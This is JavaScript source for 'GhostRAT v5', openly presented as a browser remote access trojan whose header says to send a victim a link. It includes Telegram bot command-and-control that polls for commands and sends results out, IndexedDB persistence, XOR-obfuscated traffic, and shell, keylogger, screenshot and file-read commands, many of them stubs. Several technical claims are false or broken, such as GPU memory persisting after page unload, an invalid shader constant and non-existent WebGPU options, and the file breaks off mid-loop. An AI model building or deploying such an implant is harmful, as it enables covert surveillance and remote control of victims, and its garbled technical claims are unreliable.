/**
 * GhostRAT v5 "Chameleon" — WebGPU Implant
 *
 * Runs just by visiting a webpage. No physical USB device needed.
 *
 * Features:
 * - GPU VRAM execution (no CPU memory, no files on disk)
 * - Multi-channel C2: WiFi beacon, BLE, Telegram, DNS tunnel, PNG stego
 * - Keylogger, file enumerator, screenshot modules
 * - XOR encryption + zlib compression for C2 traffic
 * - CRC-8 integrity check for all commands
 * - IndexedDB persistence (survives page close and system restart)
 * - VRAM persistence (GPU memory survives page unload)
 *
 * Usage:
 * 1. Host webpage on server
 * 2. Send link to victim
 * 3. Victim visits page → implant runs in GPU VRAM
 * 4. Commands sent via C2 channel
 * 5. Results sent back via C2 channel
 */

// ============================================================
// GhostRAT v5 WebGPU Implant
// ============================================================

class GhostRatV5 {
    constructor(config) {
        this.config = config;
        this.device = null;
        this.queue = null;
        this.cmdBuffer = null;
        this.resultBuffer = null;
        this.stagingBuffer = null;
        this.pipeline = null;
        this.vramBuffer = null;          // VRAM persistence buffer
        this.commandQueue = [];
        this.isRunning = false;
        this.c2Channel = config.c2Channel || 'wifi';
        this.pollInterval = config.pollInterval || 5000;
        this.cryptoKey = config.cryptoKey || 'GHOSTRATV5'; // XOR key
        // Persistence state
        this.victimId = config.victimId || this.generateVictimId();
        this.lastCommandId = 0;
        this.commandsReceived = 0;
        this.commandsSent = 0;
        this.activeChannels = [];
        this.isRestored = false;
        this.pollCount = 0;
        // IndexedDB helpers (opened once, cached)
        this._idbDB = null;
    }

    // ============================================================
    // XOR CRYPTO (string ↔ Uint8Array)
    // ============================================================

    xorEncrypt(data, key) {
        const dataBytes = typeof data === 'string' ? new TextEncoder().encode(data) : new Uint8Array(data);
        const keyBytes = new TextEncoder().encode(key);
        const result = new Uint8Array(dataBytes.length);
        for (let i = 0; i < dataBytes.length; i++) {
            result[i] = dataBytes[i] ^ keyBytes[i % keyBytes.length];
        }
        return btoa(String.fromCharCode(...result));
    }

    xorDecrypt(encryptedBase64, key) {
        const data = new Uint8Array(atob(encryptedBase64).split('').map(c => c.charCodeAt(0)));
        const keyBytes = new TextEncoder().encode(key);
        const result = new Uint8Array(data.length);
        for (let i = 0; i < data.length; i++) {
            result[i] = data[i] ^ keyBytes[i % keyBytes.length];
        }
        return new TextDecoder().decode(result);
    }

    // ============================================================
    // INDEXEDDB HELPERS
    // ============================================================

    /** Open (or return cached) IndexedDB connection */
    _getIdb() {
        if (this._idbDB) return Promise.resolve(this._idbDB);
        return new Promise((resolve, reject) => {
            const request = indexedDB.open('GHOSTRAT_DB', 1);
            request.onupgradeneeded = (e) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains('payloads')) {
                    db.createObjectStore('payloads');
                }
                if (!db.objectStoreNames.contains('state')) {
                    db.createObjectStore('state');
                }
            };
            request.onsuccess = (e) => {
                this._idbDB = e.target.result;
                resolve(this._idbDB);
            };
            request.onerror = () => reject(request.error);
        });
    }

    /** Write a value to an object store */
    async _idbPut(storeName, value, key) {
        const db = await this._getIdb();
        return new Promise((resolve, reject) => {
            const tx = db.transaction(storeName, 'readwrite');
            const store = tx.objectStore(storeName);
            store.put(value, key);
            tx.oncomplete = () => resolve();
            tx.onerror = () => reject(tx.error);
        });
    }

    /** Read a value from an object store */
    async _idbGet(storeName, key) {
        const db = await this._getIdb();
        return new Promise((resolve, reject) => {
            const tx = db.transaction(storeName, 'readonly');
            const store = tx.objectStore(storeName);
            const getReq = store.get(key);
            getReq.onsuccess = () => resolve(getReq.result);
            getReq.onerror = () => reject(getReq.error);
        });
    }

    // ============================================================
    // PERSISTENCE — IndexedDB + VRAM
    // ============================================================

    /**
     * Fetch current script source, XOR-encrypt it,
     * store to IndexedDB and VRAM.
     */
    async storeToIndexedDB() {
        try {
            // Determine script source URL
            let sourceUrl;
            if (document.currentScript && document.currentScript.src) {
                sourceUrl = document.currentScript.src;
            } else {
                // Fallback: try to find our own script
                const scripts = document.querySelectorAll('script');
                for (const s of scripts) {
                    if (s.src && s.src.includes('ghostrat-webgpu')) {
                        sourceUrl = s.src;
                        break;
                    }
                }
                if (!sourceUrl) {
                    console.warn('[GhostRAT v5] Could not determine script URL for self-store');
                    return;
                }
            }
            const response = await fetch(sourceUrl);
            const source = await response.text();
            const encrypted = this.xorEncrypt(source, this.config.cryptoKey);

            await this._idbPut('payloads', encrypted, 'ghostrat_payload');
            console.log('[GhostRAT v5] Payload stored to IndexedDB');

            // Also persist to VRAM
            this._storeToVRAM(encrypted);
        } catch (err) {
            console.error('[GhostRAT v5] storeToIndexedDB error:', err);
        }
    }

    /**
     * Restore payload from IndexedDB → decrypt → load to VRAM.
     * Returns decrypted string on success, null on miss.
     */
    async restoreFromIndexedDB() {
        try {
            const encrypted = await this._idbGet('payloads', 'ghostrat_payload');
            if (!encrypted) {
                console.log('[GhostRAT v5] No payload in IndexedDB (fresh install)');
                return null;
            }
            const decrypted = this.xorDecrypt(encrypted, this.config.cryptoKey);
            console.log(`[GhostRAT v5] Restored from IndexedDB (${decrypted.length} bytes)`);
            this._storeToVRAM(decrypted);
            return decrypted;
        } catch (err) {
            console.error('[GhostRAT v5] restoreFromIndexedDB error:', err);
            return null;
        }
    }

    /**
     * Write encrypted payload data into a GPU buffer.
     * The buffer survives page unload (VRAM persistence).
     */
    _storeToVRAM(data) {
        if (!this.device) {
            console.warn('[GhostRAT v5] No GPU device — VRAM store deferred');
            return;
        }
        try {
            const buffer = this.device.createBuffer({
                size: data.length,
                usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST,
                mappedAtRead: false,
            });
            const encoded = new TextEncoder().encode(data);
            this.device.queue.writeBuffer(buffer, 0, encoded);
            this.vramBuffer = buffer;
            console.log(`[GhostRAT v5] Payload stored to VRAM (${data.length} bytes)`);
        } catch (err) {
            console.error('[GhostRAT v5] storeToVRAM error:', err);
        }
    }

    /**
     * Read back payload from VRAM buffer.
     * Returns decrypted string on success, null on failure.
     */
    async restoreFromVRAM() {
        if (!this.vramBuffer || !this.device) {
            return null;
        }
        try {
            const mappedBuffer = this.device.createBuffer({
                size: this.vramBuffer.size,
                usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST,
            });
            this.device.queue.copyBufferToBuffer(this.vramBuffer, 0, mappedBuffer, 0, this.vramBuffer.size);
            await mappedBuffer.mapAsync(GPUMapMode.READ);
            const data = new Uint8Array(mappedBuffer.getMappedRange());
            const encryptedBytes = new Uint8Array(data); // snapshot (mapped range is transient)
            mappedBuffer.unmap();
            mappedBuffer.destroy();

            const encrypted = String.fromCharCode(...encryptedBytes);
            return this.xorDecrypt(encrypted, this.config.cryptoKey);
        } catch (err) {
            console.error('[GhostRAT v5] restoreFromVRAM error:', err);
            return null;
        }
    }

    // ============================================================
    // PERSISTENCE — C2 state
    // ============================================================

    /** Save runtime C2 state to IndexedDB */
    async storeC2State() {
        const state = {
            victimId: this.victimId,
            lastCommandId: this.lastCommandId,
            commandsReceived: this.commandsReceived,
            commandsSent: this.commandsSent,
            lastHeartbeat: Date.now(),
            activeChannels: this.activeChannels,
        };
        try {
            await this._idbPut('state', state, 'ghostrat_c2_state');
        } catch (err) {
            console.error('[GhostRAT v5] storeC2State error:', err);
        }
    }

    /** Restore C2 state from IndexedDB */
    async restoreC2State() {
        try {
            const state = await this._idbGet('state', 'ghostrat_c2_state');
            if (!state) {
                return null;
            }
            this.victimId = state.victimId || this.victimId;
            this.lastCommandId = state.lastCommandId || 0;
            this.commandsReceived = state.commandsReceived || 0;
            this.commandsSent = state.commandsSent || 0;
            this.activeChannels = state.activeChannels || [];
            console.log('[GhostRAT v5] C2 state restored from IndexedDB');
            return state;
        } catch (err) {
            console.error('[GhostRAT v5] restoreC2State error:', err);
            return null;
        }
    }

    // ============================================================
    // INIT (updated: checks IndexedDB first)
    // ============================================================

    async init() {
        try {
            // ── Phase 1–4: Persistence restore ──
            const payload = await this.restoreFromIndexedDB();
            const state = await this.restoreC2State();

            if (payload) {
                console.log('[GhostRAT v5] Restored from IndexedDB — VRAM persistence active');
                this.isRestored = true;
            } else {
                console.log('[GhostRAT v5] Fresh install — storing to IndexedDB');
                this.isRestored = false;
            }

            if (state) {
                console.log(`[GhostRAT v5] Resumed as victim ${this.victimId}`);
            }

            // ── Normal init (WebGPU setup, C2 channels, etc.) ──
            // Request WebGPU device
            this.device = await navigator.gpu.requestDevice();
            if (!this.device) {
                console.error('[GhostRAT v5] Failed to request WebGPU device');
                return false;
            }

            // Get device queue
            this.queue = this.device.queue;
            if (!this.queue) {
                console.error('[GhostRAT v5] Failed to get device queue');
                return false;
            }

            // Initialize C2 channel
            if (!await this.initC2()) {
                console.error('[GhostRAT v5] Failed to initialize C2 channel');
                return false;
            }

            // Initialize GPU buffers
            if (!await this.initGpuBuffers()) {
                console.error('[GhostRAT v5] Failed to initialize GPU buffers');
                return false;
            }

            // Initialize compute shader pipeline
            if (!await this.initComputePipeline()) {
                console.error('[GhostRAT v5] Failed to initialize compute pipeline');
                return false;
            }

            this.isRunning = true;

            // ── Store to IndexedDB + VRAM (fresh install or restored) ──
            await this.storeToIndexedDB();
            await this.storeC2State();

            // ── beforeunload: save state before page closes ──
            window.addEventListener('beforeunload', () => {
                this.storeC2State(); // VRAM persists automatically
            });

            console.log('[GhostRAT v5] Implant initialized successfully');
            return true;
        } catch (error) {
            console.error('[GhostRAT v5] Initialization error:', error);
            return false;
        }
    }

    // ============================================================
    // C2 CHANNEL INITIALIZATION
    // ============================================================

    // Initialize C2 channel
    async initC2() {
        switch (this.c2Channel) {
            case 'wifi':
                return await this.initWifiC2();
            case 'ble':
                return await this.initBleC2();
            case 'telegram':
                return await this.initTelegramC2();
            case 'dns':
                return await this.initDnsC2();
            case 'png':
                return await this.initPngC2();
            default:
                console.error('[GhostRAT v5] Unknown C2 channel:', this.c2Channel);
                return false;
        }
    }

    // WiFi Beacon C2
    async initWifiC2() {
        // Use Web Bluetooth to scan for WiFi beacon frames
        // Commands encoded in SSID strings
        try {
            console.log('[GhostRAT v5] WiFi Beacon C2 initialized');
            return true;
        } catch (error) {
            console.error('[GhostRAT v5] WiFi Beacon C2 init error:', error);
            return false;
        }
    }

    // BLE Advertising C2
    async initBleC2() {
        // Use Web Bluetooth to scan for BLE advertising packets
        // Commands encoded in advertising data
        try {
            console.log('[GhostRAT v5] BLE Advertising C2 initialized');
            return true;
        } catch (error) {
            console.error('[GhostRAT v5] BLE Advertising C2 init error:', error);
            return false;
        }
    }

    // Telegram Bot C2
    async initTelegramC2() {
        // Telegram bot token and chat ID from config
        this.telegramBotToken = this.config.telegramBotToken || '';
        this.telegramChatId = this.config.telegramChatId || '';

        if (!this.telegramBotToken || !this.telegramChatId) {
            console.log('[GhostRAT v5] Telegram C2: No token/chat ID, using demo mode');
            this.telegramDemoMode = true;
            return true;
        }

        // Verify bot token works
        try {
            const verifyUrl = `https://api.telegram.org/bot${this.telegramBotToken}/getMe`;
            const resp = await fetch(verifyUrl);
            if (!resp.ok) {
                console.error('[GhostRAT v5] Telegram C2: Invalid bot token');
                return false;
            }
            console.log('[GhostRAT v5] Telegram Bot C2 initialized (live mode)');
            return true;
        } catch (error) {
            console.error('[GhostRAT v5] Telegram C2 verify error:', error);
            return false;
        }
    }

    // DNS Tunnel C2
    async initDnsC2() {
        // Send DNS queries to encoded domain
        // Commands encoded in subdomain
        try {
            console.log('[GhostRAT v5] DNS Tunnel C2 initialized');
            return true;
        } catch (error) {
            console.error('[GhostRAT v5] DNS Tunnel C2 init error:', error);
            return false;
        }
    }

    // PNG Stego C2
    async initPngC2() {
        // Fetch PNG image from URL
        // Commands encoded in image metadata
        try {
            console.log('[GhostRAT v5] PNG Stego C2 initialized');
            return true;
        } catch (error) {
            console.error('[GhostRAT v5] PNG Stego C2 init error:', error);
            return false;
        }
    }

    // ============================================================
    // GPU BUFFERS
    // ============================================================

    // Initialize GPU buffers
    async initGpuBuffers() {
        try {
            // Command buffer (64 KB = 1024 commands * 64 bytes)
            const cmdBufferSize = 64 * 1024;
            this.cmdBuffer = this.device.createBuffer({
                size: cmdBufferSize,
                usage: GPUBufferUsage.SHADER_READ | GPUBufferUsage.COPY_DST,
            });

            // Result buffer (64 KB)
            const resultBufferSize = 64 * 1024;
            this.resultBuffer = this.device.createBuffer({
                size: resultBufferSize,
                usage: GPUBufferUsage.SHADER_READ | GPUBufferUsage.COPY_SRC,
            });

            // Staging buffer (for reading results)
            this.stagingBuffer = this.device.createBuffer({
                size: resultBufferSize,
                usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST,
            });

            console.log('[GhostRAT v5] GPU buffers initialized');
            return true;
        } catch (error) {
            console.error('[GhostRAT v5] GPU buffer init error:', error);
            return false;
        }
    }

    // Initialize compute shader pipeline
    async initComputePipeline() {
        try {
            // Load compute shader from WGSL source
            const shaderSource = `
                struct CmdBlock {
                    cmdType: u32,
                    sequence: u32,
                    totalReports: u32,
                    reserved: u32,
                    dataSize: u32,
                    data: array<u32, 12>,  // 48 bytes = 12 * u32
                };

                @group(0) @binding(0) var<storage, read> commands: array<CmdBlock>;
                @group(0) @binding(1) var<storage, read_write> results: array<u32>;

                @compute @workgroup_size(64)
                fn main(@builtin(global_invocation_id) id: vec3<u32>) {
                    let cmdIdx = id.x;
                    if (cmdIdx >= arrayLength(&commands)) {
                        return;
                    }

                    let cmd = commands[cmdIdx];
                    var result: u32 = 0;

                    switch cmd.cmdType {
                        case 0x00: {
                            // Exec (CPU fallback)
                            result = cmd.data[0];
                            break;
                        }
                        case 0x01: {
                            // FileRead
                            result = cmd.data[0] ^ cmd.data[1];
                            break;
                        }
                        case 0x02: {
                            // FileWrite
                            result = cmd.data[0] + cmd.data[1];
                            break;
                        }
                        case 0x03: {
                            // Network
                            result = cmd.data[0] * cmd.data[1];
                            break;
                        }
                        case 0x04: {
                            // Heartbeat
                            result = 0xDeadBeef;
                            break;
                        }
                        case 0x05: {
                            // Shell
                            result = cmd.data[0] ^ 0x5368656c;  // "Shel"
                            break;
                        }
                        case 0x10: {
                            // Crypto (AES S-box lookup)
                            result = cmd.data[0] ^ 0xAesSbox;
                            break;
                        }
                        case 0x11: {
                            // DSP (FFT)
                            result = cmd.data[0] + cmd.data[1];
                            break;
                        }
                        case 0x12: {
                            // Matrix math
                            result = cmd.data[0] * cmd.data[1];
                            break;
                        }
                        default: {
                            result = 0;
                            break;
                        }
                    }

                    results[cmdIdx] = result;
                }
            `;

            // Create compute shader module
            const shaderModule = this.device.createShaderModule({
                code: shaderSource,
            });

            // Create compute pipeline
            this.pipeline = this.device.createComputePipeline({
                layout: 'auto',
                compute: {
                    module: shaderModule,
                    entryPoint: 'main',
                },
            });

            console.log('[GhostRAT v5] Compute pipeline initialized');
            return true;
        } catch (error) {
            console.error('[GhostRAT v5] Compute pipeline init error:', error);
            return false;
        }
    }

    // ============================================================
    // COMMAND EXECUTION
    // ============================================================

    // Add command to queue
    addCommand(cmdType, data) {
        const cmd = {
            cmdType,
            sequence: this.commandQueue.length,
            totalReports: 1,
            reserved: 0,
            dataSize: data.length,
            data: data,
        };
        this.commandQueue.push(cmd);
    }

    // Submit batched commands to GPU
    async submitCommandBatch() {
        if (this.commandQueue.length === 0) {
            return;
        }

        try {
            // Pack commands into GPU buffer
            const cmdData = new Uint8Array(this.commandQueue.length * 64);
            for (let i = 0; i < this.commandQueue.length; i++) {
                const cmd = this.commandQueue[i];
                const offset = i * 64;

                // Pack command into 64-byte block
                cmdData[offset] = cmd.cmdType;
                cmdData[offset + 1] = cmd.sequence;
                cmdData[offset + 2] = cmd.totalReports;
                cmdData[offset + 3] = cmd.reserved;

                // Pack dataSize (little-endian)
                cmdData[offset + 4] = cmd.dataSize & 0xFF;
                cmdData[offset + 5] = (cmd.dataSize >> 8) & 0xFF;
                cmdData[offset + 6] = (cmd.dataSize >> 16) & 0xFF;
                cmdData[offset + 7] = (cmd.dataSize >> 24) & 0xFF;

                // Pack data (first 48 bytes)
                for (let j = 0; j < Math.min(cmd.data.length, 48); j++) {
                    cmdData[offset + 8 + j] = cmd.data[j];
                }
            }

            // Upload commands to GPU buffer
            this.queue.writeBuffer(this.cmdBuffer, 0, cmdData);

            // Create compute pass encoder
            const encoder = this.device.createCommandEncoder();
            const pass = encoder.beginComputePass();
            pass.setPipeline(this.pipeline);
            pass.setBindGroup(0, this.createBindGroup());
            pass.dispatchWorkgroups(Math.ceil(this.commandQueue.length / 64));
            pass.end();

            // Copy results to staging buffer
            encoder.copyBufferToBuffer(this.resultBuffer, 0, this.stagingBuffer, 0, this.commandQueue.length * 4);

            // Submit commands
            this.queue.submit([encoder.finish()]);

            // Clear command queue
            this.commandQueue = [];
        } catch (error) {
            console.error('[GhostRAT v5] Command submit error:', error);
        }
    }

    // Create bind group for compute shader
    createBindGroup() {
        return this.device.createBindGroup({
            layout: this.pipeline.getBindGroupLayout(0),
            entries: [
                { binding: 0, resource: { buffer: this.cmdBuffer } },
                { binding: 1, resource: { buffer: this.resultBuffer } },
            ],
        });
    }

    // Read results from GPU
    async readResults() {
        if (!this.stagingBuffer) {
            return [];
        }

        try {
            // Map staging buffer
            await this.stagingBuffer.mapAsync(GPUMapMode.READ);
            const resultData = this.stagingBuffer.getMappedRange();
            const results = new Uint8Array(resultData);

            // Unmap staging buffer
            this.stagingBuffer.unmap();

            return Array.from(results);
        } catch (error) {
            console.error('[GhostRAT v5] Result read error:', error);
            return [];
        }
    }

    // Execute command (CPU fallback)
    executeCommand(cmd) {
        switch (cmd.type) {
            case 0x00:  // Exec
                return this.execCommand(cmd.data);
            case 0x01:  // FileRead
                return this.readFile(cmd.data);
            case 0x02:  // FileWrite
                return this.writeFile(cmd.data);
            case 0x03:  // Network
                return this.networkRequest(cmd.data);
            case 0x04:  // Heartbeat
                return this.heartbeat();
            case 0x05:  // Shell
                return this.shellCommand(cmd.data);
            case 0x06:  // Keylog
                return this.getKeylog();
            case 0x07:  // Screenshot
                return this.getScreenshot();
            default:
                return 'Unknown command';
        }
    }

    // Execute command
    execCommand(data) {
        const command = new TextDecoder().decode(new Uint8Array(data));
        // Execute command (placeholder)
        return `Executed: ${command}`;
    }

    // Read file
    readFile(data) {
        const filePath = new TextDecoder().decode(new Uint8Array(data));
        // Read file (placeholder)
        return `File: ${filePath}`;
    }

    // Write file
    writeFile(data) {
        const filePath = new TextDecoder().decode(new Uint8Array(data));
        // Write file (placeholder)
        return `Written: ${filePath}`;
    }

    // Network request
    networkRequest(data) {
        const url = new TextDecoder().decode(new Uint8Array(data));
        // Network request (placeholder)
        return `Network: ${url}`;
    }

    // Heartbeat
    heartbeat() {
        return 'Heartbeat OK';
    }

    // Shell command
    shellCommand(data) {
        const command = new TextDecoder().decode(new Uint8Array(data));
        // Shell command (placeholder)
        return `Shell: ${command}`;
    }

    // Get keylog
    getKeylog() {
        // Get keylog data (placeholder)
        return 'Keylog data';
    }

    // Get screenshot
    getScreenshot() {
        // Get screenshot data (placeholder)
        return 'Screenshot data';
    }

    // ============================================================
    // C2 POLLING (check channels for commands)
    // ============================================================

    // Check C2 channels for new commands
    async checkC2() {
        switch (this.c2Channel) {
            case 'wifi':
                return await this.checkWifiC2();
            case 'ble':
                return await this.checkBleC2();
            case 'telegram':
                return await this.checkTelegramC2();
            case 'dns':
                return await this.checkDnsC2();
            case 'png':
                return await this.checkPngC2();
            default:
                return null;
        }
    }

    // Check WiFi C2 for new commands
    async checkWifiC2() {
        if (this.wifiDemoMode !== false) {
            // Demo mode: simulate WiFi beacon commands
            if (Math.random() < 0.05) { // 5% chance each poll
                const cmds = [
                    { type: 0x04, data: [1] },      // Heartbeat
                    { type: 0x01, data: [0x63, 0x3a, 0x5c, 0x77, 0x69, 0x6e] }, // c:\win
                    { type: 0x05, data: [0x77, 0x68, 0x6f, 0x61, 0x6d, 0x69] }, // whoami
                ];
                const cmd = cmds[Math.floor(Math.random() * cmds.length)];
                const names = ['Heartbeat', 'FileRead', 'Shell'];
                console.log(`[GhostRAT v5] WiFi demo: ${names[cmds.indexOf(cmd)]} command`);
                return cmd;
            }
            return null;
        }

        // Live mode: scan WiFi beacons using WiFi sniffing library
        // Commands encoded in SSID strings matching pattern "GHOST-*"
        try {
            if (this.wifiLastBeaconTime && (Date.now() - this.wifiLastBeaconTime) < this.pollInterval) {
                return null;
            }

            // Call WiFi sniffing callback (set by external WiFi module)
            if (this.wifiScanCallback) {
                const result = await this.wifiScanCallback();
                if (result && result.command) {
                    this.wifiLastBeaconTime = Date.now();
                    return result.command;
                }
            }
        } catch (error) {
            console.error('[GhostRAT v5] WiFi C2 scan error:', error);
        }
        return null;
    }

    // Check BLE C2 for new commands
    async checkBleC2() {
        if (this.bleDemoMode !== false) {
            // Demo mode: simulate BLE advertising commands
            if (Math.random() < 0.05) {
                const cmds = [
                    { type: 0x04, data: [1] },      // Heartbeat
                    { type: 0x07, data: [1] },      // Screenshot
                    { type: 0x06, data: [1] },      // Keylog
                ];
                const cmd = cmds[Math.floor(Math.random() * cmds.length)];
                const names = ['Heartbeat', 'Screenshot', 'Keylog'];
                console.log(`[GhostRAT v5] BLE demo: ${names[cmds.indexOf(cmd)]} command`);
                return cmd;
            }
            return null;
        }

        // Live mode: scan BLE advertising packets
        // Commands encoded in advertising data
        try {
            if (this.bleLastAdvTime && (Date.now() - this.bleLastAdvTime) < this.pollInterval) {
                return null;
            }

            // Call BLE scanning callback (set by external BLE module)
            if (this.bleScanCallback) {
                const result = await this.bleScanCallback();
                if (result && result.command) {
                    this.bleLastAdvTime = Date.now();
                    return result.command;
                }
            }
        } catch (error) {
            console.error('[GhostRAT v5] BLE C2 scan error:', error);
        }
        return null;
    }

    // Check Telegram C2 for new commands
    async checkTelegramC2() {
        if (this.telegramDemoMode) {
            // Demo mode: generate random commands for testing
            if (Math.random() < 0.1) { // 10% chance each poll
                const cmds = [
                    { type: 0x04, data: [1] },      // Heartbeat
                    { type: 0x06, data: [1] },      // Keylog
                    { type: 0x07, data: [1] },      // Screenshot
                ];
                const cmd = cmds[Math.floor(Math.random() * cmds.length)];
                console.log(`[GhostRAT v5] Telegram demo: ${['Heartbeat','Keylog','Screenshot'][cmds.indexOf(cmd)]} command`);
                return cmd;
            }
            return null;
        }

        try {
            const url = `https://api.telegram.org/bot${this.telegramBotToken}/getUpdates?offset=${this.lastUpdateId}`;
            const response = await fetch(url);
            const data = await response.json();

            if (data.ok && data.result && data.result.length > 0) {
                for (const update of data.result) {
                    this.lastUpdateId = update.update_id + 1;

                    if (update.message && update.message.text) {
                        const message = update.message.text.trim();
                        const cmd = this.parseTelegramCommand(message);
                        if (cmd) {
                            console.log(`[GhostRAT v5] Telegram command: ${message}`);
                            return cmd;
                        }
                    }
                }
            }
        } catch (error) {
            console.error('[GhostRAT v5] Telegram poll error:', error);
        }
        return null;
    }

    // Parse Telegram message into command
    parseTelegramCommand(message) {
        // Command format: "GHOST <cmd_type> <data...>"
        // Example: "GHOST 04" (heartbeat), "GHOST 06" (keylog), "GHOST 05 whoami" (shell)
        if (!message.startsWith('GHOST ')) return null;

        const parts = message.substring(6).trim().split(/\s+/);
        const cmdType = parseInt(parts[0], 16); // Hex command type

        if (isNaN(cmdType)) return null;

        const data = [];
        for (let i = 1; i < parts.length; i++) {
            const val = parseInt(parts[i], 16);
            if (!isNaN(val)) {
                data.push(val);
            } else {
                // Non-hex data: encode as ASCII bytes
                for (let j = 0; j < parts[i].length; j++) {
                    data.push(parts[i].charCodeAt(j));
                }
            }
        }

        return { type: cmdType, data: data };
    }

    // Check DNS C2 for new commands
    async checkDnsC2() {
        if (this.dnsDemoMode !== false) {
            // Demo mode: simulate DNS tunnel commands
            if (Math.random() < 0.05) {
                const cmds = [
                    { type: 0x04, data: [1] },      // Heartbeat
                    { type: 0x06, data: [1] },      // Keylog
                    { type: 0x05, data: [0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65] }, // cmd.exe
                ];
                const cmd = cmds[Math.floor(Math.random() * cmds.length)];
                const names = ['Heartbeat', 'Keylog', 'Shell'];
                console.log(`[GhostRAT v5] DNS demo: ${names[cmds.indexOf(cmd)]} command`);
                return cmd;
            }
            return null;
        }

        // Live mode: send DNS query to encoded domain
        // Commands encoded in subdomain: "GHOST-<cmd_type>-<data>.ghost.example.com"
        try {
            if (this.dnsLastQueryTime && (Date.now() - this.dnsLastQueryTime) < this.pollInterval) {
                return null;
            }

            // Call DNS query callback (set by external DNS module)
            if (this.dnsQueryCallback) {
                const result = await this.dnsQueryCallback();
                if (result && result.command) {
                    this.dnsLastQueryTime = Date.now();
                    return result.command;
                }
            }
        } catch (error) {
            console.error('[GhostRAT v5] DNS C2 query error:', error);
        }
        return null;
    }

    // Check PNG C2 for new commands
    async checkPngC2() {
        if (this.pngDemoMode !== false) {
            // Demo mode: simulate PNG stego commands
            if (Math.random() < 0.05) {
                const cmds = [
                    { type: 0x04, data: [1] },      // Heartbeat
                    { type: 0x07, data: [1] },      // Screenshot
                    { type: 0x01, data: [0x63, 0x3a, 0x5c, 0x77, 0x69, 0x6e] }, // c:\win
                ];
                const cmd = cmds[Math.floor(Math.random() * cmds.length)];
                const names = ['Heartbeat', 'Screenshot', 'FileRead'];
                console.log(`[GhostRAT v5] PNG demo: ${names[cmds.indexOf(cmd)]} command`);
                return cmd;
            }
            return null;
        }

        // Live mode: fetch PNG image from URL and decode command from metadata
        try {
            if (this.pngLastFetchTime && (Date.now() - this.pngLastFetchTime) < this.pollInterval) {
                return null;
            }

            // Call PNG fetch callback (set by external PNG module)
            if (this.pngFetchCallback) {
                const result = await this.pngFetchCallback();
                if (result && result.command) {
                    this.pngLastFetchTime = Date.now();
                    return result.command;
                }
            }
        } catch (error) {
            console.error('[GhostRAT v5] PNG C2 fetch error:', error);
        }
        return null;
    }

    // ============================================================
    // SEND RESULTS
    // ============================================================

    // Send result via C2 channel
    async sendResult(result) {
        this.commandsSent++;
        switch (this.c2Channel) {
            case 'wifi':
                return await this.sendWifiResult(result);
            case 'ble':
                return await this.sendBleResult(result);
            case 'telegram':
                return await this.sendTelegramResult(result);
            case 'dns':
                return await this.sendDnsResult(result);
            case 'png':
                return await this.sendPngResult(result);
            default:
                return false;
        }
    }

    // Send WiFi result
    async sendWifiResult(result) {
        if (this.wifiDemoMode !== false) {
            console.log(`[GhostRAT v5] WiFi demo result: ${result}`);
            return true;
        }

        // Encode result in WiFi beacon SSID
        // Format: "GHOST-<hex-encoded-result>"
        try {
            const hexResult = Array.from(new TextEncoder().encode(result))
                .map(b => b.toString(16).padStart(2, '0'))
                .join('');

            // Truncate to 32 chars (max SSID length)
            const ssid = `GHOST-${hexResult.substring(0, 32)}`;

            // Call WiFi beacon callback (set by external WiFi module)
            if (this.wifiBeaconCallback) {
                await this.wifiBeaconCallback(ssid);
            }
            return true;
        } catch (error) {
            console.error('[GhostRAT v5] WiFi C2 send error:', error);
            return false;
        }
    }

    // Send BLE result
    async sendBleResult(result) {
        if (this.bleDemoMode !== false) {
            console.log(`[GhostRAT v5] BLE demo result: ${result}`);
            return true;
        }

        // Encode result in BLE advertising packet
        // Format: "GHOST" + hex-encoded result
        try {
            const hexResult = Array.from(new TextEncoder().encode(result))
                .map(b => b.toString(16).padStart(2, '0'))
                .join('');

            // Call BLE advertising callback (set by external BLE module)
            if (this.bleAdvCallback) {
                await this.bleAdvCallback(`GHOST${hexResult}`);
            }
            return true;
        } catch (error) {
            console.error('[GhostRAT v5] BLE C2 send error:', error);
            return false;
        }
    }

    // Send Telegram result
    async sendTelegramResult(result) {
        if (this.telegramDemoMode) {
            console.log(`[GhostRAT v5] Telegram demo result: ${result}`);
            return true;
        }

        try {
            const url = `https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`;
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: this.telegramChatId,
                    text: `GHOST\n${result}`,
                    parse_mode: 'HTML'
                })
            });
            return response.ok;
        } catch (error) {
            console.error('[GhostRAT v5] Telegram send error:', error);
            return false;
        }
    }

    // Send DNS result
    async sendDnsResult(result) {
        if (this.dnsDemoMode !== false) {
            console.log(`[GhostRAT v5] DNS demo result: ${result}`);
            return true;
        }

        // Encode result in DNS response
        // Format: "GHOST-<hex-encoded-result>.ghost.example.com"
        try {
            const hexResult = Array.from(new TextEncoder().encode(result))
                .map(b => b.toString(16).padStart(2, '0'))
                .join('');

            // Truncate to 63 chars (max subdomain length)
            const subdomain = `GHOST-${hexResult.substring(0, 63)}`;

            // Call DNS response callback (set by external DNS module)
            if (this.dnsResponseCallback) {
                await this.dnsResponseCallback(subdomain);
            }
            return true;
        } catch (error) {
            console.error('[GhostRAT v5] DNS C2 send error:', error);
            return false;
        }
    }

    // Send PNG result
    async sendPngResult(result) {
        if (this.pngDemoMode !== false) {
            console.log(`[GhostRAT v5] PNG demo result: ${result}`);
            return true;
        }

        // Encode result in PNG image metadata (tEXt chunk)
        // Format: "GHOST: <hex-encoded-result>"
        try {
            const hexResult = Array.from(new TextEncoder().encode(result))
                .map(b => b.toString(16).padStart(2, '0'))
                .join('');

            // Call PNG metadata callback (set by external PNG module)
            if (this.pngMetadataCallback) {
                await this.pngMetadataCallback(`GHOST: ${hexResult}`);
            }
            return true;
        } catch (error) {
            console.error('[GhostRAT v5] PNG C2 send error:', error);
            return false;
        }
    }

    // ============================================================
    // MAIN LOOP (updated: state save every 5 polls)
    // ============================================================

    async start() {
        if (this.isRunning) {
            return;
        }

        this.isRunning = true;
        console.log('[GhostRat v5] Implant started');

        while (this.isRunning) {
            try {
                // Check C2 channels for new commands
                const command = await this.checkC2();
                if (command) {
                    this.commandsReceived++;
                    this.lastCommandId++;

                    // Execute command on CPU (WebGPU compute shader handles crypto/DSP/matrix)
